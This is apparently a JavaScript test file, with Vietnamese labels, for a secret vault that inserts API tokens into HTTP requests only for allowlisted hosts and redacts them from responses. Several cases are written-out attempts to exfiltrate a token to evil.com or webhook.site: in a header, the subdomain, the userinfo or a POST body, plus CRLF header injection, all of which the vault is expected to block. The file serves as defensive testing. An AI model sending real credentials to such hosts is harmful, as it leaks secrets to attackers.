// Thử luật vault: `node vault/test-lib.mjs`
import { prepare, redact, hostAllowed, namesIn } from './lib.js';

const S = {
  GITHUB_TOKEN: { value: 'ghp_thatbimat123', hosts: ['api.github.com'] },
  CF_TOKEN: { value: 'cf/bi mat+2', hosts: ['.cloudflare.com'] },
  LOCAL_KEY: { value: 'local-key-999', hosts: ['localhost'] },
};
let fail = 0;
const t = (name, fn, shouldPass) => {
  let ok, msg = '';
  try { const r = fn(); ok = shouldPass; if (!shouldPass) msg = `LẼ RA PHẢI CHẶN ${JSON.stringify(r)}`; }
  catch (e) { ok = !shouldPass; msg = e.message; }
  console.log(`  ${ok ? '✓' : '✗'} ${name}${msg ? ` → ${msg}` : ''}`);
  if (!ok) fail++;
};
const expect = (c, what) => { if (!c) throw new Error(what); return c; };

t('điền khoá vào header', () => {
  const r = prepare({ url: 'https://api.github.com/user', headers: { Authorization: 'Bearer {{secret.GITHUB_TOKEN}}' } }, S);
  expect(r.headers.Authorization === 'Bearer ghp_thatbimat123' && r.used[0] === 'GITHUB_TOKEN', JSON.stringify(r));
}, true);
t('khoá gửi tới tên miền lạ', () => prepare({ url: 'https://evil.com/x', headers: { A: '{{secret.GITHUB_TOKEN}}' } }, S), false);
t('khoá trong tên miền', () => prepare({ url: 'https://{{secret.GITHUB_TOKEN}}.evil.com/', headers: {} }, S), false);
t('khoá trong userinfo', () => prepare({ url: 'https://{{secret.GITHUB_TOKEN}}@api.github.com/', headers: {} }, S), false);
t('khoá trong query tới đúng nơi', () => expect(prepare({ url: 'https://api.github.com/x?t={{secret.GITHUB_TOKEN}}' }, S).url.includes('ghp_'), 'thiếu'), true);
t('khoá trong body tới nơi lạ', () => prepare({ method: 'POST', url: 'https://webhook.site/x', body: '{"t":"{{secret.GITHUB_TOKEN}}"}' }, S), false);
t('tên miền con .cloudflare.com', () => prepare({ url: 'https://api.cloudflare.com/v4', headers: { A: '{{secret.CF_TOKEN}}' } }, S), true);
t('.cloudflare.com không khớp cloudflare.com.evil.net', () => prepare({ url: 'https://cloudflare.com.evil.net/', headers: { A: '{{secret.CF_TOKEN}}' } }, S), false);
t('http tới máy ngoài', () => prepare({ url: 'http://api.github.com/', headers: { A: '{{secret.GITHUB_TOKEN}}' } }, S), false);
t('http tới localhost', () => prepare({ url: 'http://localhost:8080/', headers: { A: '{{secret.LOCAL_KEY}}' } }, S), true);
t('khoá không tồn tại', () => prepare({ url: 'https://api.github.com/', headers: { A: '{{secret.NOPE_KEY}}' } }, S), false);
t('header chèn xuống dòng', () => prepare({ url: 'https://api.github.com/', headers: { A: 'x\r\nHost: evil.com' } }, S), false);
t('method lạ', () => prepare({ method: 'CONNECT', url: 'https://api.github.com/' }, S), false);
t('không dùng khoá thì gọi đâu cũng được', () => prepare({ url: 'https://example.com/' }, S), true);
t('ẩn khoá trong phản hồi', () => {
  const r = redact('token=ghp_thatbimat123&cf=cf%2Fbi%20mat%2B2 và cf/bi mat+2', S);
  expect(!r.includes('ghp_thatbimat123') && !r.includes('cf%2Fbi') && !r.includes('cf/bi mat') && r.includes('[ĐÃ ẨN:GITHUB_TOKEN]'), r);
}, true);
t('hostAllowed đúng tuyệt đối', () => expect(hostAllowed('API.GITHUB.COM', ['api.github.com']) && !hostAllowed('xapi.github.com', ['api.github.com']), 'sai'), true);
t('namesIn', () => expect(namesIn('a {{ secret.A_B }} {{secret.C_D}}').join() === 'A_B,C_D', 'sai'), true);

if (fail) { console.log(`✗ ${fail} mục hỏng`); process.exit(1); }
console.log('✓ luật vault đạt');
